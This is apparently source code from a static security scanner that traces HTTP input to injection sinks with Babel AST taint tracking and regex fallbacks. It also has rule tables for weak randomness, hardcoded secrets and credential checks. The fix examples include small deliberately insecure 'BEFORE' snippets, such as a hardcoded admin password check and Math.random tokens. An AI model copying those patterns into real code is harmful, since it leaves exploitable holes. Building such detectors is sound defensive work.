                'ArrowFunctionExpression|FunctionExpression'(path) {
                    const HTTP_KEYS = ['body','params','query','headers','cookies'];
                    path.node.params.forEach(param => {
                        if (param.type !== 'ObjectPattern') return;
                        param.properties.forEach(prop => {
                            if (!prop.key) return;
                            const KEY = prop.key.name;
                            if (!HTTP_KEYS.includes(KEY)) return;
                            const varName = (prop.value && prop.value.type === 'Identifier')
                                ? prop.value.name : prop.key.name;
                            const line = prop.loc ? prop.loc.start.line : 1;
                            const srcInfo = {
                                label: `req.${KEY}`,
                                category: "HTTP Input (Destructured)",
                                inputType: KEY,
                                variable: varName,
                                line, file: fp,
                                snippet: lines[line-1]?.trim() || ""
                            };
                            sources.push(srcInfo);
                            const binding = path.scope.getBinding(varName);
                            if (binding) traceDataFlow(binding, srcInfo, [{
                                type: "source",
                                label: `AST Destructured Param: req.${KEY}`,
                                line,
                                snippet: srcInfo.snippet
                            }]);
                        });
                    });
                },
                MemberExpression(path) {
                    let objName, propName;
                    if (path.node.object.type === 'Identifier') {
                        objName = path.node.object.name;
                        propName = path.node.property.name || path.node.property.value;
                    } else if (path.node.object.type === 'MemberExpression' && path.node.object.object.type === 'Identifier') {
                        objName = path.node.object.object.name;
                        propName = path.node.property.name || path.node.property.value;
                    }
                    
                    // Also track req itself when body/query/etc accessed directly
                    if (propName === 'body' && ['req','request'].includes(objName)) {
                        // Mark req.body itself as a taint source (whole-body access)
                        const wbLine = path.node.loc?.start?.line || 1;
                        const wbSrc = { label: 'req.body', category: 'HTTP Body', inputType: 'body',
                            variable: null, line: wbLine, file: fp, snippet: lines[wbLine-1]?.trim()||'' };
                        const wbDecl = path.findParent(p => p.isVariableDeclarator());
                        if (wbDecl && wbDecl.node.id.type === 'Identifier') {
                            wbSrc.variable = wbDecl.node.id.name;
                            sources.push(wbSrc);
                            const wbBinding = wbDecl.scope.getBinding(wbDecl.node.id.name);
                            if (wbBinding) traceDataFlow(wbBinding, wbSrc, [{type:'source',label:'req.body (whole)',line:wbLine,snippet:wbSrc.snippet}]);
                        }
                    }
                    if (['req', 'request', 'ctx'].includes(objName) && ['query', 'params', 'body', 'headers', 'cookies'].includes(propName)) {
                        const line = path.node.loc.start.line;
                        const label = `${objName}.${propName}`;
                        const srcInfo = {
                            label, category: "HTTP Input", inputType: propName,
                            variable: null, line, file: fp, snippet: lines[line-1]?.trim() || ""
                        };

                        const decl = path.findParent(p => p.isVariableDeclarator());
                        if (decl) {
                            if (decl.node.id.type === 'Identifier') {
                                srcInfo.variable = decl.node.id.name;
                                sources.push(srcInfo);
                                const binding = decl.scope.getBinding(decl.node.id.name);
                                if (binding) traceDataFlow(binding, srcInfo, [{type:"source", label:"AST Input: "+label, line, snippet: srcInfo.snippet}]);
                            } else if (decl.node.id.type === 'ObjectPattern') {
                                decl.node.id.properties.forEach(prop => {
                                    if (prop.value && prop.value.type === 'Identifier') {
                                        const subSrcInfo = {...srcInfo, variable: prop.value.name, label: `${label}.${prop.key.name}`};
                                        sources.push(subSrcInfo);
                                        const binding = decl.scope.getBinding(prop.value.name);
                                        if (binding) traceDataFlow(binding, subSrcInfo, [{type:"source", label:"AST Destructured Input: "+subSrcInfo.label, line, snippet: srcInfo.snippet}]);
                                    }
                                });
                            }
                        } else {
                            // Inline usage passed directly to a function
                            sources.push(srcInfo);
                            const parentCall = path.findParent(p => p.isCallExpression());
                            if (parentCall) checkSinkOrSanitizer(parentCall, srcInfo, [{type:"source", label:"AST Inline Input: "+label, line, snippet: srcInfo.snippet}], null);
                        }
                    }
                }
            }
        };

        function traceDataFlow(binding, srcInfo, pathHistory, visited = new Set()) {
            if (!binding || visited.has(binding)) return;
            // A heavily-referenced binding is a framework utility, not a real taint source
            if (binding.referencePaths.length > 30) return;
            visited.add(binding);

            binding.referencePaths.forEach(refPath => {
                const line = refPath.node.loc?.start?.line || 1;
                const snippet = lines[line-1]?.trim() || "";

                // Advanced Context: Control Flow Guard Detection (Type Guards)
                const ifStmt = refPath.findParent(p => p.isIfStatement());
                if (ifStmt) {
                    const test = ifStmt.get('test');
                    let isGuarded = false;
                    try {
                        if (test.isBinaryExpression() && ['===','!==','==','!='].includes(test.node.operator)) {
                            if (test.node.left.type === 'UnaryExpression' && test.node.left.operator === 'typeof') isGuarded = true;
                            if (test.node.left.type === 'Identifier' && test.node.right.type === 'StringLiteral') isGuarded = true; // role check
                        } else if (test.isCallExpression() && ['isNaN', 'Number', 'Boolean', 'String'].includes(test.node.callee.name)) {
                            isGuarded = true;
                        }
                    } catch(e) {}
                    
                    if (isGuarded) {
                        pathHistory = [...pathHistory, { type: "sanitizer", label: "Control Flow Guard (Type Check)", line: ifStmt.node.loc.start.line, snippet: lines[ifStmt.node.loc.start.line-1]?.trim()||"", sanitized: true, sanitizerType: "Type Guard" }];
                    }
                }

                // CallExpression checking (Sinks & Inline Sanitizers)
                // Walk ancestor call expressions; capped at 20 levels to avoid deep RxJS chains
                let _callPath = refPath.parentPath;
                let _walkDepth = 0;
                while (_callPath && _walkDepth < 20) {
                    _walkDepth++;
                    if (_callPath.isCallExpression()) {
                        const parentCall = _callPath;
                        const isArg = parentCall.node.arguments.some(arg => {
                        if (arg === refPath.node) return true;
                        if (arg.type === 'SpreadElement' && arg.argument === refPath.node) return true;
                        if (arg.type === 'TemplateLiteral') {
                            // Deep-search the template literal expressions (fixes nested calls like security.hash(req.body.x))
                            const deepFind = (node) => {
                                if (!node || typeof node !== 'object') return false;
                                if (node === refPath.node) return true;
                                return Object.values(node).some(v =>
                                    Array.isArray(v) ? v.some(deepFind) :
                                    (v && typeof v === 'object' && v.type ? deepFind(v) : false)
                                );
                            };
                            if (arg.expressions.some(deepFind)) return true;
                        }
                        if (arg.type === 'BinaryExpression' && (arg.left === refPath.node || arg.right === refPath.node)) return true;
                        if (arg.type === 'ObjectExpression') {
                           return arg.properties.some(prop => (prop.type === 'SpreadElement' && prop.argument === refPath.node) || (prop.value === refPath.node));
                        }
                        return false;
                    });
                    
                        if (isArg || parentCall.get('callee') === refPath) {
                            const sanitizedHere = checkSinkOrSanitizer(parentCall, srcInfo, [...pathHistory], refPath);
                            if (sanitizedHere) { _callPath = null; break; }
                        }
                    }
                    _callPath = _callPath ? _callPath.parentPath : null;
                }

                // Variable Assignment Return Value Tracking (Sanitizer Precision)
                const parentAssign = refPath.findParent(p => p.isVariableDeclarator() || p.isAssignmentExpression());
                if (parentAssign) {
                    let newVarName = null;
                    let isSanitizedAssignment = false;
                    let sLabel = "";
                    
                    if (parentAssign.isVariableDeclarator() && parentAssign.node.init) {
                        if (parentAssign.node.id.type === 'Identifier') {
                            newVarName = parentAssign.node.id.name;
                            if (parentAssign.node.init.type === 'CallExpression') {
                                try {
                                    const calleeStr = parentAssign.get('init.callee').toString() + "(";
                                    for (const sp of SANITIZER_PATTERNS) {
                                        sp.regex.lastIndex = 0;
                                        if (sp.regex.test(calleeStr)) {
                                            isSanitizedAssignment = true; sLabel = sp.type; break;
                                        }
                                    }
                                } catch(e){}
                            }
                        }
                    } else if (parentAssign.isAssignmentExpression() && parentAssign.node.right) {
                        if (parentAssign.node.left.type === 'Identifier') {
                            newVarName = parentAssign.node.left.name;
                            if (parentAssign.node.right.type === 'CallExpression') {
                                try {
                                    const calleeStr = parentAssign.get('right.callee').toString() + "(";
                                    for (const sp of SANITIZER_PATTERNS) {
                                        sp.regex.lastIndex = 0;
                                        if (sp.regex.test(calleeStr)) {
                                            isSanitizedAssignment = true; sLabel = sp.type; break;
                                        }
                                    }
                                } catch(e){}
                            }
                        }
                    }

                    if (newVarName) {
                        const newBinding = parentAssign.scope.getBinding(newVarName);
                        if (newBinding) {
                            const newHistory = [...pathHistory, { 
                                type: isSanitizedAssignment ? 'sanitizer' : 'propagation', 
                                line, 
                                label: isSanitizedAssignment ? `Sanitized via ${sLabel} into "${newVarName}"` : `Assigned to shadowed/aliased var "${newVarName}"`, 
                                snippet, sanitized: isSanitizedAssignment, sanitizerType: isSanitizedAssignment ? sLabel : null
                            }];
                            traceDataFlow(newBinding, srcInfo, newHistory, visited);
                        }
                    }

                    // Fix 2: Follow ?? and || coalescing operators
                    // Juice Shop uses patterns like: const criteria = req.query.q ?? ''
                    // Without this, the taint trail breaks at the coalescing expression.
                    try {
                        const logicalParent = refPath.findParent(p => p.isLogicalExpression());
                        if (logicalParent &&
                            (logicalParent.node.operator === '||' || logicalParent.node.operator === '??')) {
                            const assignParent = logicalParent.findParent(p => p.isVariableDeclarator());
                            if (assignParent && assignParent.node.id &&
                                assignParent.node.id.type === 'Identifier') {
                                const coalescedVar = assignParent.node.id.name;
                                const coalescedBinding = assignParent.scope.getBinding(coalescedVar);
                                if (coalescedBinding && !visited.has(coalescedBinding)) {
                                    const cLine = assignParent.node.loc?.start?.line || line;
                                    traceDataFlow(coalescedBinding, srcInfo, [...pathHistory, {
                                        type: 'propagation',
                                        label: `Coalesced (${logicalParent.node.operator}) into "${coalescedVar}"`,
                                        line: cLine,
                                        snippet: lines[cLine-1]?.trim() || "",
                                        sanitized: false,
                                        sanitizerType: null
                                    }], visited);
                                }
                            }
                        }
                    } catch(e) {}

                    // Ternary propagation: const x = cond ? tainted : other  →  x is tainted
                    try {
                        const condExpr = refPath.findParent(p => p.isConditionalExpression());
                        if (condExpr) {
                            const condAssign = condExpr.findParent(p => p.isVariableDeclarator() || p.isAssignmentExpression());
                            if (condAssign) {
                                let cvName = null;
                                if (condAssign.isVariableDeclarator() && condAssign.node.id?.type === 'Identifier') {
                                    cvName = condAssign.node.id.name;
                                } else if (condAssign.isAssignmentExpression() && condAssign.node.left?.type === 'Identifier') {
                                    cvName = condAssign.node.left.name;
                                }
                                if (cvName) {
                                    const cvBinding = condAssign.scope.getBinding(cvName);
                                    if (cvBinding && !visited.has(cvBinding)) {
                                        const cvLine = condAssign.node.loc?.start?.line || line;
                                        traceDataFlow(cvBinding, srcInfo, [...pathHistory, {
                                            type: 'propagation',
                                            label: `Ternary branch assigned to "${cvName}"`,
                                            line: cvLine,
                                            snippet: lines[cvLine-1]?.trim() || "",
                                            sanitized: false, sanitizerType: null
                                        }], visited);
                                    }
                                }
                            }
                        }
                    } catch(e) {}

                    // Return value propagation: if tainted var is returned from a named function,
                    // find all call sites that assign the return value and trace them
                    try {
                        const retStmt = refPath.findParent(p => p.isReturnStatement());
                        if (retStmt) {
                            const fnNode = retStmt.findParent(p =>
                                p.isFunctionDeclaration() || p.isFunctionExpression() || p.isArrowFunctionExpression());
                            if (fnNode) {
                                let fnName = null;
                                if (fnNode.isFunctionDeclaration()) {
                                    fnName = fnNode.node.id?.name;
                                } else {
                                    const vd = fnNode.findParent(p => p.isVariableDeclarator());
                                    if (vd?.node.id?.type === 'Identifier') fnName = vd.node.id.name;
                                }
                                if (fnName) {
                                    const fnBinding = fnNode.scope.getBinding(fnName) ||
                                        fnNode.scope.getProgramParent().getBinding(fnName);
                                    if (fnBinding) {
                                        fnBinding.referencePaths.forEach(callRef => {
                                            const callExpr = callRef.findParent(p => p.isCallExpression());
                                            if (!callExpr) return;
                                            const retAssign = callExpr.findParent(p =>
                                                p.isVariableDeclarator() || p.isAssignmentExpression());
                                            if (!retAssign) return;
                                            let retVar = null;
                                            if (retAssign.isVariableDeclarator() && retAssign.node.id?.type === 'Identifier') {
                                                retVar = retAssign.node.id.name;
                                            } else if (retAssign.isAssignmentExpression() && retAssign.node.left?.type === 'Identifier') {
                                                retVar = retAssign.node.left.name;
                                            }
                                            if (retVar) {
                                                const retBinding = retAssign.scope.getBinding(retVar);
                                                if (retBinding && !visited.has(retBinding)) {
                                                    const rvLine = retAssign.node.loc?.start?.line || line;
                                                    traceDataFlow(retBinding, srcInfo, [...pathHistory, {
                                                        type: 'propagation',
                                                        label: `Return value of ${fnName}() assigned to "${retVar}"`,
                                                        line: rvLine,
                                                        snippet: lines[rvLine-1]?.trim() || "",
                                                        sanitized: false, sanitizerType: null
                                                    }], visited);
                                                }
                                            }
                                        });
                                    }
                                }
                            }
                        }
                    } catch(e) {}
                }
            });
        }

        function checkSinkOrSanitizer(parentCall, srcInfo, pathHistory, refPath) {
            const callee = parentCall.get('callee');
            let calleeStr = "";
            try { calleeStr = callee.toString() + "("; } catch(e) { return false; }
            
            const line = parentCall.node.loc?.start?.line || 1;
            const snippet = lines[line-1]?.trim() || "";

            // Check Sani
            for (const sp of SANITIZER_PATTERNS) {
                sp.regex.lastIndex = 0;
                if (sp.regex.test(calleeStr)) {
                    sanitizers.push({ type: sp.type, line, file: fp, snippet });
                    pathHistory.push({ type: "sanitizer", label: sp.type, line, snippet, sanitized: true, sanitizerType: sp.type });
                    return true; 
                }
            }

            // Check Sinks
            for (const sp of SINK_PATTERNS) {
                sp.regex.lastIndex = 0;
                if (sp.regex.test(calleeStr)) {
                    const isSanitized = pathHistory.some(p => p.sanitized);
                    let argsStr = "args";
                    try { argsStr = parentCall.get('arguments').map(a => a.toString()).join(", "); } catch(e){}
                    
                    sinks.push({ type: sp.type, severity: sp.severity, vuln: sp.vuln, cwe: sp.cwe, stride: sp.stride, line, file: fp, snippet, usedVars: [srcInfo.variable], args: argsStr });
                    
                    const id = `ast:${fp}:${srcInfo.line}:${line}:${sp.vuln.replace(/\s/g,'_')}`;
                    if (!findings.find(f => f.id === id)) {
                        findings.push({
                            id, source: srcInfo,
                            sink: { type: sp.type, severity: sp.severity, vuln: sp.vuln, cwe: sp.cwe, stride: sp.stride, line, file: fp, snippet, args: argsStr },
                            path: [...pathHistory, { type: "sink", label: `Semantic AST Target: ${sp.type}`, line, snippet }],
                            isSanitized, sanitizerType: isSanitized ? "Sanitizer" : null,
                            severity: isSanitized ? "info" : sp.severity,
                            vuln: sp.vuln, cwe: sp.cwe, stride: sp.stride, file: fp, parser: "AST"
                        });
                    }
                    return false;
                }
            }
            return false;
        }
    };

    try {
        babelTransformSync(code, {
            filename: fp,
            presets: [presetReact, [presetTypescript, { isTSX: true, allExtensions: true }]],
            plugins: [astTaintTrackerPlugin],
            ast: false, code: false,
            babelrc: false, configFile: false,
        });
    } catch(e) { throw e; }

    const uSrc = [...new Map(sources.map(s => [s.line+s.label, s])).values()];
    const uSnk = [...new Map(sinks.map(s => [s.line+s.type, s])).values()];
    return { findings, sources: uSrc, sinks: uSnk, sanitizers };
}

/* Fallback legacy Regex scanner for non-JS/TS files */
// FP-1: detect known-safe sink call shapes so user input that flows through
// parameterized DB drivers / list-form subprocess / Java PreparedStatement
// doesn't get reported as injection.
function _isParameterizedDbCall(args){
  // First arg is a quoted literal followed by comma + remaining args.
  // Recognizes Python f/r/b string prefixes, JS template literals are intentionally
  // excluded because they can interpolate user input.
  if(!args) return false;
  return /^\s*(?:f|r|b|rb|br|u)?['"](?:[^'"\\]|\\.)*['"]\s*,/i.test(args);
}
function _isSafeSubprocessCall(args){
  // First arg is a list literal AND no shell=True: argv array, no shell injection surface.
  if(!args) return false;
  return /^\s*\[/.test(args) && !/shell\s*=\s*True/i.test(args);
}
function _isSafeExecFileCall(args){
  // execFile(<cmd>, [<args>]) — second arg list literal means no shell.
  if(!args) return false;
  return /^\s*['"][^'"]*['"]\s*,\s*\[/.test(args);
}
function _detectSafeSinkShape(vuln, args){
  if(/SQL Injection|NoSQL Injection/.test(vuln) && _isParameterizedDbCall(args)) return 'parameterized-db';
  if(/Command Injection/.test(vuln)) {
    if (_isSafeSubprocessCall(args)) return 'subprocess-list';
    if (_isSafeExecFileCall(args)) return 'execFile-list';
  }
  return null;
}

// Feat-1: Python in-file helper-taint pass. When a tainted variable flows into
// a locally-defined `def helper(param)` call, mark the helper's parameter as
// a synthetic source within the helper's body. Findings inside the helper get
// attributed back to the original HTTP/request source.
//
// This is single-file inter-procedural taint via regex. Full tree-sitter AST
// for Python is deferred (requires WASM bundling) — tracked in #11 for
// follow-up. This implementation closes the most common Python FN class:
// `cursor.execute(...)` inside a helper called with `request.args.get(...)`.
function _augmentPythonSources(fp, raw, baseSources){
  if (!/\.py$/i.test(fp)) return baseSources;
  const lines = raw.split('\n');
  const augmented = [...baseSources];
  // Build a map of locally-defined functions: name → {paramNames, bodyStart, bodyEnd}
  const fnDefs = new Map();
  const fnRe = /^(\s*)def\s+(\w+)\s*\(([^)]*)\)\s*:/gm;
  let m;
  while ((m = fnRe.exec(raw))) {
    const [, indent, name, paramList] = m;
    const params = paramList.split(',').map(s => s.trim().split(/[:\s=]/)[0]).filter(p => p && p !== 'self' && p !== 'cls');
    const startLine = raw.substring(0, m.index).split('\n').length;
    // Body extends until next def/class at same-or-shallower indent, or EOF
    let endLine = lines.length;
    const indentLen = indent.length;
    for (let i = startLine; i < lines.length; i++) {
      const ln = lines[i];
      if (/^\s*$/.test(ln)) continue;
      const lnIndent = ln.match(/^\s*/)[0].length;
      if (lnIndent <= indentLen && /^\s*(?:def|class)\s/.test(ln)) { endLine = i; break; }
    }
    fnDefs.set(name, { params, bodyStart: startLine + 1, bodyEnd: endLine });
  }
  if (fnDefs.size === 0) return augmented;
  // Find call sites where any tainted variable is passed to a tracked function.
  // For each call, mark the corresponding parameter as a synthetic source within
  // the function body's line range.
  const taintedVars = new Set(baseSources.map(s => s.variable).filter(Boolean));
  // Also include single-pass intra-line propagation: `x = request.args.get(...)`
  // already gives x as a source. Catch one-step assignments: `y = x` where x is tainted.
  for (let i = 0; i < lines.length; i++) {
    const ln = lines[i];
    const am = ln.match(/^\s*(\w+)\s*=\s*(\w+)\s*(?:\.|\[|$)/);
    if (am && taintedVars.has(am[2])) taintedVars.add(am[1]);
  }
  // Pass tainted vars into helper functions
  for (const [fnName, def] of fnDefs) {
    const callRe = new RegExp(`\\b${fnName}\\s*\\(([^)]*)\\)`, 'g');
    let cm;
    while ((cm = callRe.exec(raw))) {
      const callLine = raw.substring(0, cm.index).split('\n').length;
      // Skip the def line itself
      const defLine = lines[callLine - 1] || '';
      if (/^\s*def\s+/.test(defLine)) continue;
      const argList = cm[1].split(',').map(s => s.trim());
      for (let pIdx = 0; pIdx < def.params.length && pIdx < argList.length; pIdx++) {
        const arg = argList[pIdx];
        // Crude check: arg is exactly a tainted variable name OR contains one as a token
        const argTainted = [...taintedVars].some(v => new RegExp(`\\b${v}\\b`).test(arg));
        if (!argTainted) continue;
        // Mark this parameter as a synthetic source within the helper's body
        const param = def.params[pIdx];
        augmented.push({
          label: `param ${param} (tainted via ${fnName}() call)`,
          category: 'Python In-File Helper Param',
          inputType: 'helper-param',
          variable: param,
          line: def.bodyStart,
          file: fp,
          snippet: lines[def.bodyStart - 1]?.trim() || '',
          _bodyStart: def.bodyStart,
          _bodyEnd: def.bodyEnd,
        });
      }
    }
  }
  return augmented;
}

function performRegexAnalysis(fp,raw){const cleaned=stripNoise(raw);const lines=raw.split("\n");const findings=[],sources=[],sinks=[],sanitizers=[];
  for(const sp of SOURCE_PATTERNS){const re=new RegExp(sp.regex.source,sp.regex.flags);let m;while((m=re.exec(cleaned))){const line=lineAt(cleaned,m.index);const lt=lines[line-1]||"";const am=lt.match(/(?:const|let|var|)\s*(\w+)\s*=/)||lt.match(/(\w+)\s*=/);sources.push({label:sp.getLabel(m),category:sp.category,inputType:sp.inputType(m),variable:am?am[1]:null,line,file:fp,snippet:lt.trim()});}}
  // Feat-1: in-file Python helper-taint propagation. Pushes synthetic sources
  // for function parameters that are tainted via call-site argument flow.
  if (/\.py$/i.test(fp)) {
    const augmented = _augmentPythonSources(fp, raw, sources);
    for (let i = sources.length; i < augmented.length; i++) sources.push(augmented[i]);
  }
  for(const sp of SINK_PATTERNS){
    // FP-7: per-pattern language scoping — skip patterns that only apply to certain extensions
    if(sp.langScope && !sp.langScope.test(fp))continue;
    const re=new RegExp(sp.regex.source,sp.regex.flags);let m;while((m=re.exec(cleaned))){const line=lineAt(cleaned,m.index);const lt=lines[line-1]||"";
    // FP-7: per-pattern surrounding-context gate — required call must appear in nearby lines
    if(sp.contextRe){const surround=lines.slice(Math.max(0,line-5),Math.min(lines.length,line+2)).join("\n");if(!sp.contextRe.test(surround))continue;}
    const af=raw.substring(m.index,Math.min(raw.length,m.index+500));const am=af.match(/\(((?:[^()]|\([^()]*\)){0,400})\)/);const args=am?am[1]:"";const uv=[...new Set((args.match(/\b[a-zA-Z_]\w*\b/g)||[]).filter(v=>!["true","false","null","undefined","const","let","var","function","return","if","else","new","this","async","await","typeof","instanceof","void"].includes(v)&&v.length>1))];const safeShape=_detectSafeSinkShape(sp.vuln,args);sinks.push({type:sp.type,severity:sp.severity,vuln:sp.vuln,cwe:sp.cwe,stride:sp.stride,line,file:fp,snippet:lt.trim(),usedVars:uv,args:args.trim(),safeShape});}}
  for(const sp of SANITIZER_PATTERNS){const re=new RegExp(sp.regex.source,sp.regex.flags);let m;while((m=re.exec(cleaned))){const line=lineAt(cleaned,m.index);const lt=lines[line-1]||"";const am=lt.match(/(?:const|let|var|)\s*(\w+)\s*=/)||lt.match(/(\w+)\s*=/);sanitizers.push({type:sp.type,line,file:fp,snippet:lt.trim(),outputVar:am?am[1]:null});}}
  const tv=new Map();for(const src of sources)if(src.variable)tv.set(src.variable,{source:src,path:[{type:"source",label:"Input: "+src.label,line:src.line,snippet:src.snippet}],sanitized:false,sanitizerType:null});
  for(let i=0;i<lines.length;i++){const lt=lines[i];const am=lt.match(/(?:const|let|var|)\s*(\w+)\s*=\s*(.+)/);if(!am)continue;const[,dv,rhs]=am;if(tv.has(dv))continue;for(const[tn,ti]of tv){if(!new RegExp(`\\b${tn}\\b`).test(rhs))continue;let san=false,st=null;for(const s of sanitizers)if(s.line===i+1){san=true;st=s.type;break;}if(!san)for(const sp of SANITIZER_PATTERNS)if(new RegExp(sp.regex.source,sp.regex.flags).test(rhs)){san=true;st=sp.type;break;}tv.set(dv,{source:ti.source,path:[...ti.path,{type:san?"sanitizer":"propagation",label:san?`${st} on ${dv}`:`Assigned to "${dv}"`,line:i+1,snippet:lt.trim(),sanitized:san,sanitizerType:st}],sanitized:san,sanitizerType:st});break;}}
  for(const sink of sinks){const safeShapeDowngrade=sink.safeShape?{isSan:true,sanType:sink.safeShape}:null;for(const src of sources){const sv=src.variable;let reached=false,pp=[],isSan=false,st=null;if(sv&&sink.usedVars.includes(sv)){const ti=tv.get(sv);if(ti){reached=true;pp=ti.path;isSan=!!ti.sanitized;st=ti.sanitizerType;}}if(!reached)for(const uv of sink.usedVars)if(tv.has(uv)){const ti=tv.get(uv);if(ti.source===src||ti.source.label.includes(src.label)){reached=true;pp=ti.path;isSan=!!ti.sanitized;st=ti.sanitizerType;break;}}if(!reached&&sv&&Math.abs(sink.line-src.line)<200&&((sink.args&&new RegExp(`\\b${sv}\\b`).test(sink.args))||lines.slice(Math.max(0,sink.line-10),sink.line+5).some(l=>new RegExp(`\\b${sv}\\b`).test(l)))){reached=true;pp=[{type:"source",label:"Input: "+src.label,line:src.line,snippet:src.snippet}];
// FP-3: only credit a sanitizer here if it has a captured outputVar AND that var
// is what reaches the sink. A bare `escape(s);` (return discarded) does NOT count.
for(const san of sanitizers){
  if(san.line<=src.line||san.line>=sink.line)continue;
  if(!san.outputVar)continue;                                // discarded return → not effective
  const sinkUsesOutput = sink.usedVars.includes(san.outputVar);
  if(!sinkUsesOutput)continue;
  isSan=true;st=san.type;
  pp.push({type:"sanitizer",label:san.type,line:san.line,snippet:san.snippet,sanitized:true,sanitizerType:san.type});
}}if(safeShapeDowngrade&&!isSan){isSan=true;st=safeShapeDowngrade.sanType;pp=[...pp,{type:"sanitizer",label:`Safe sink shape: ${safeShapeDowngrade.sanType}`,line:sink.line,snippet:sink.snippet,sanitized:true,sanitizerType:safeShapeDowngrade.sanType}];}if(reached){const id=`${fp}:${src.line}:${sink.line}:${sink.vuln.replace(/\s/g,"_")}`;if(!findings.find(f=>f.id===id))findings.push({id,source:src,sink,path:[...pp,{type:"sink",label:`${sink.type}: ${sink.args}`,line:sink.line,snippet:sink.snippet}],isSanitized:isSan,sanitizerType:st,severity:isSan?"info":sink.severity,vuln:sink.vuln,cwe:sink.cwe,stride:sink.stride,file:fp,parser:"REGEX"});}}for(const uv of sink.usedVars)if(tv.has(uv)){const ti=tv.get(uv);const id=`${fp}:${ti.source.line}:${sink.line}:${sink.vuln.replace(/\s/g,"_")}`;if(!findings.find(f=>f.id===id)){const isSanFinal=!!ti.sanitized||!!sink.safeShape;const sanTypeFinal=ti.sanitizerType||(sink.safeShape?sink.safeShape:null);const pathFinal=sink.safeShape&&!ti.sanitized?[...ti.path,{type:"sanitizer",label:`Safe sink shape: ${sink.safeShape}`,line:sink.line,snippet:sink.snippet,sanitized:true,sanitizerType:sink.safeShape}]:ti.path;findings.push({id,source:ti.source,sink,path:[...pathFinal,{type:"sink",label:`${sink.type}: ${sink.args}`,line:sink.line,snippet:sink.snippet}],isSanitized:isSanFinal,sanitizerType:sanTypeFinal,severity:isSanFinal?"info":sink.severity,vuln:sink.vuln,cwe:sink.cwe,stride:sink.stride,file:fp,parser:"REGEX"});}}}
  return{findings,sources,sinks,sanitizers};}

function performAnalysis(fp, raw) {
    if (/\.(js|jsx|ts|tsx)$/i.test(fp) && typeof Babel !== 'undefined') {
        // Skip AST for files that contain no server-side HTTP input patterns — nothing to taint-track
        const hasHTTPInput = /\b(?:req|request|ctx)\s*\.\s*(?:body|query|params|headers|cookies)\b/.test(raw);
        // Angular files use HttpRequest.body/.params/.headers but these are NOT Express taint sources
        const isAngular = /(?:from\s+['"]@angular|@(?:Component|Injectable|NgModule|Directive|Pipe)\s*\()/i.test(raw);
        // Skip AST for large files (>150KB) or minified files (fewer than 10 lines, >5KB)
        const lines = raw.split('\n');
        const isMinified = (lines.length < 10 && raw.length > 5000) || (raw.length / Math.max(lines.length,1) > 400 && raw.length > 10000);
        const isLarge = raw.length > 150000;
        if (hasHTTPInput && !isAngular && !isMinified && !isLarge) {
            try { return performASTAnalysis(fp, raw); }
            catch(e) { console.warn("AST Parser failed for", fp, "falling back to Regex"); return performRegexAnalysis(fp, raw); }
        }
    }
    return performRegexAnalysis(fp, raw);
}

function scanRoutes(fp,raw){const cleaned=stripNoise(raw);const lines=raw.split("\n");const routes=[];const mwAuth=detectMiddlewareAuth(raw);for(const p of ROUTE_PATTERNS){const re=new RegExp(p.regex.source,p.regex.flags);let m;while((m=re.exec(cleaned))){let method="GET";if(p.mI&&m[p.mI]){const r=m[p.mI].toUpperCase();method=["GET","POST","PUT","PATCH","DELETE","ALL","OPTIONS","HEAD"].includes(r)?r:"GET";}if(p.mtI&&m[p.mtI]){const fm=m[p.mtI].replace(/['"]/g,"").split(",").map(s=>s.trim().toUpperCase());if(fm.length)method=fm[0];}const path=p.pI&&m[p.pI]?m[p.pI]:"(file-based)";const line=lineAt(cleaned,m.index);let hasAuth=false;const nearby=lines.slice(Math.max(0,line-3),line+3).join(" ");if(/(?:authenticate|auth|jwt\.verify|verifyToken|authMiddleware|checkAuth|protect|authorize|isAuthorized|expressJwt|denyAll)\s*[\(,]/i.test(nearby))hasAuth=true;if(!hasAuth)for(const mw of mwAuth)if(line>mw.line&&(mw.scope==="/"||path.startsWith(mw.scope)))hasAuth=true;const rp=[];for(const sp of SOURCE_PATTERNS){const re2=new RegExp(sp.regex.source,sp.regex.flags);const block=lines.slice(Math.max(0,line-2),Math.min(lines.length,line+30)).join("\n");let m2;while((m2=re2.exec(block))){const v=m2[2]||m2[3]||m2[1];if(v)rp.push(v);}}const cls=classifyEndpoint(rp);const classifiedFields={};rp.forEach(field=>{const fc=classifyField(field);if(fc.length)classifiedFields[field]=fc;});const uploadBlock2=lines.slice(Math.max(0,line-5),Math.min(lines.length,line+40)).join("\n");const hasFileUpload=/(?:multer|busboy|formidable|upload\.(?:single|array|fields|any|none)|req\.files?\b|request\.files?\b|request\.FILES|\$_FILES|\$request->(?:file|hasFile)|multipart\/form-data|r\.FormFile|r\.MultipartForm)/i.test(uploadBlock2);routes.push({method,path,framework:p.fw,file:fp,line,hasAuth,hasFileUpload,params:rp,classifications:cls,classifiedFields});}}return routes;}

const LOGIC_PATTERNS=[
  {regex:/Math\.random\s*\(\s*\)/g,vuln:"Weak Randomness",severity:"medium",cwe:"CWE-330",stride:"Spoofing",fix:"Use crypto.randomBytes or crypto.randomUUID for security-sensitive values.",code:"// BEFORE\nconst token = Math.random().toString(36);\n\n// AFTER\nconst token = crypto.randomBytes(32).toString('hex');"},
  {regex:/(?:password|secret|api_?key|token|auth)\s*[:=]\s*['"][^'"]{3,}['"]/gi,vuln:"Hardcoded Secret",severity:"critical",cwe:"CWE-798",stride:"Information Disclosure",kind:"secret",fix:"Use environment variables or a secrets manager.",code:"// BEFORE\nconst apiKey = 'sk-abc123';\n\n// AFTER\nconst apiKey = process.env.API_KEY;"},
  {regex:/===?\s*['"](?:admin|root|password|123456|test|default)['"]/gi,vuln:"Hardcoded Credential Check",severity:"high",cwe:"CWE-798",stride:"Spoofing",kind:"secret",fix:"Use hashed password verification, never hardcoded strings.",code:"// BEFORE\nif (password === 'admin') grant();\n\n// AFTER\nconst valid = await bcrypt.compare(password, user.hashedPassword);"},
  {regex:/if\s*\(\s*(?:fs\.existsSync|fs\.access|stat)\s*\([^)]+\)\s*\)[^{]*(?:readFile|writeFile|unlink|rename)/g,vuln:"Race Condition (TOCTOU)",severity:"medium",cwe:"CWE-367",stride:"Tampering",fix:"Use atomic operations instead of check-then-act patterns.",code:"// BEFORE\nif (fs.existsSync(p)) fs.unlinkSync(p);\n\n// AFTER\ntry { fs.unlinkSync(p); } catch(e) { if(e.code!=='ENOENT') throw e; }"},
